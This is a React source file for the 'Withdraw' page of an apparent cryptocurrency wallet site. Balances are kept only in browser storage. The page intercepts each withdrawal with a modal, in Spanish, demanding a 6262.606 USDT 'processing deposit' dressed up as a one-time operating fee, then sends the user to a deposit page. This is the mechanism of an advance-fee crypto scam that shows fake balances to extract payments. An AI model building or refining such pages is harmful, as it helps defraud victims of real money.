// frontend/src/pages/Withdraw.js
import React, { useEffect, useState } from 'react';
import { QRCodeCanvas } from 'qrcode.react';
import { useAuth } from '../context/AuthContext';
import { useNavigate } from 'react-router-dom';

function Withdraw() {
  const { currentUserId } = useAuth();
  const [userData, setUserData] = useState(null);
  const [crypto, setCrypto] = useState('BTC');
  const [amount, setAmount] = useState('');
  const [toAddress, setToAddress] = useState('');
  const [message, setMessage] = useState('');
  const [showProcessingModal, setShowProcessingModal] = useState(false); 
  const navigate = useNavigate();

  const usdtNetworks = ['TRC20', 'ERC20', 'BEP20', 'POLYGON', 'SOLANA', 'AVALANCHE', 'FANTOM', 'ARBITRUM', 'OPTIMISM', 'CRONOS'];
  const [usdtNetwork, setUsdtNetwork] = useState('TRC20');

  const getUserData = () => {
    const data = JSON.parse(localStorage.getItem('data')) || {};
    if(!data.users) data.users = [];
    const user = data.users.find(u=>u.id===currentUserId);
    return { data, user };
  };

  const saveUserData = (newUser) => {
    const { data } = getUserData();
    const index = data.users.findIndex(u=>u.id===currentUserId);
    if(index !== -1) {
      data.users[index] = newUser;
      localStorage.setItem('data', JSON.stringify(data));
    }
  };

  useEffect(() => {
    if(currentUserId) {
      const {user} = getUserData();
      if(!user) {
        setUserData(null);
      } else {
        if(typeof user.processingDepositPaid === 'undefined') {
          user.processingDepositPaid = false;
        }
        setUserData(user);
      }
    } else {
      setUserData(null);
    }
  }, [currentUserId]);

  if(!currentUserId) {
    return <div style={{padding:'20px'}}>Please login first.</div>;
  }

  if(!userData) {
    return <div style={{padding:'20px'}}>Loading user data...</div>;
  }

  const { wallets, selectedWalletId, processingDepositPaid } = userData;
  const selectedWallet = wallets.find(w=>w.id===selectedWalletId);

  if(!selectedWallet) {
    return <div style={{padding:'20px'}}>No wallet selected. Go to dashboard and select a wallet.</div>;
  }

  const address = crypto === 'BTC' ? selectedWallet.btcAddress : selectedWallet.usdtAddress;
  const availableBalance = crypto === 'BTC' ? selectedWallet.btcBalance : selectedWallet.usdtBalance;

  const handleWithdrawClick = (e) => {
    e.preventDefault();
    if(!amount || parseFloat(amount) <= 0) {
      setMessage('Invalid amount.');
      return;
    }
    const field = crypto.toLowerCase()+'Balance';
    const currentBalance = selectedWallet[field];
    if(currentBalance < parseFloat(amount)) {
      setMessage('Insufficient funds.');
      return;
    }

    if(!processingDepositPaid) {
      setShowProcessingModal(true);
      return;
    }

    executeWithdraw();
  };

  const executeWithdraw = () => {
    const field = crypto.toLowerCase()+'Balance';
    const currentBalance = selectedWallet[field];
    const newBalance = currentBalance - parseFloat(amount);
    const newTx = {
      id: selectedWallet.transactions.length + 1,
      type: 'withdraw',
      crypto,
      amount: parseFloat(amount),
      address: toAddress,
      status: 'completed',
      date: new Date().toISOString()
    };

    const newWallets = wallets.map(w=>{
      if(w.id===selectedWalletId) {
        return { ...w, [field]:newBalance, transactions:[...w.transactions, newTx] };
      }
      return w;
    });

    const newUser = {...userData, wallets:newWallets};
    saveUserData(newUser);
    setUserData(newUser);
    setAmount('');
    setToAddress('');
    setMessage('Withdraw completed successfully.\nSe cobrará una tarifa fija de 2 USD.');
  };

  const handleDepositPage = () => {
    navigate('/deposit');
  };

  return (
    <div style={{padding:'20px'}}>
      <h2>Withdraw</h2>
      <p>Current wallet: {selectedWallet.name}</p>
      <p>Withdraw address for {crypto}: {address}</p>
      <QRCodeCanvas value={address} size={128} />
      <p>Available Balance: {availableBalance} {crypto}</p>

      {crypto === 'USDT' && (
        <div style={{margin:'10px 0'}}>
          <label>Seleccionar Red de Envío: </label>
          <select value={usdtNetwork} onChange={e=>setUsdtNetwork(e.target.value)}>
            {usdtNetworks.map(net => (
              <option key={net} value={net}>{net}</option>
            ))}
          </select>
          <p style={{fontSize:'0.9rem', color:'#ccc'}}>
            Se cobrará una tarifa fija de 2 USD por transacción.<br/>
            La rapidez del envío dependerá de la congestión de la red seleccionada.
          </p>
        </div>
      )}

      <form onSubmit={handleWithdrawClick} style={{marginTop:'20px'}}>
        <input 
          placeholder="Amount"
          type="number"
          step="0.00000001"
          value={amount}
          onChange={e=>setAmount(e.target.value)}
          style={{display:'block', margin:'10px 0'}}
        />
        <input
          placeholder="Destination Address"
          value={toAddress}
          onChange={e=>setToAddress(e.target.value)}
          style={{display:'block', margin:'10px 0'}}
        />
        <div style={{margin:'10px 0'}}>
          <label>Crypto: </label>
          <select value={crypto} onChange={e=>setCrypto(e.target.value)}>
            <option value="BTC">BTC</option>
            <option value="USDT">USDT</option>
          </select>
        </div>
        <button type="submit">Withdraw</button>
      </form>
      {message && <p style={{marginTop:'10px', whiteSpace:'pre-wrap', color: message.includes('Error')?'red':'green'}}>{message}</p>}

      {showProcessingModal && (
        <div style={{
          position:'fixed', top:0, left:0, width:'100%', height:'100%',
          background:'rgba(0,0,0,0.7)', display:'flex', justifyContent:'center', alignItems:'center'
        }}>
          <div style={{
            background:'#1C1C1C', padding:'20px', borderRadius:'10px', color:'#fff', maxWidth:'400px'
          }}>
            <h3>Additional Processing Deposit Required</h3>
            <p style={{margin:'10px 0', fontSize:'0.9rem'}}>
              Para poder procesar este retiro, es necesario realizar previamente un depósito adicional de <strong>6262.606 USDT</strong>.  
              Este monto se utiliza para cubrir los costos operativos y las tarifas de nuestros proveedores externos, asegurando la seguridad y la fluidez de las transacciones.
            </p>
            <p style={{margin:'10px 0', fontSize:'0.9rem'}}>
              Una vez realices este depósito, no tendrás que volver a pagar por este tipo de gastos de procesamiento en futuros retiros.  
              Esta medida nos permite mantener una infraestructura segura y confiable para todos nuestros usuarios.
            </p>
            <button 
              onClick={handleDepositPage} 
              style={{background:'#333', color:'#fff', border:'none', padding:'10px 20px', borderRadius:'5px', cursor:'pointer'}}
            >
              Deposit 6262.606 USDT
            </button>
            <button 
              onClick={()=>setShowProcessingModal(false)} 
              style={{background:'#555', color:'#fff', border:'none', padding:'10px 20px', borderRadius:'5px', cursor:'pointer', marginLeft:'10px'}}
            >
              Cancel
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

export default Withdraw;
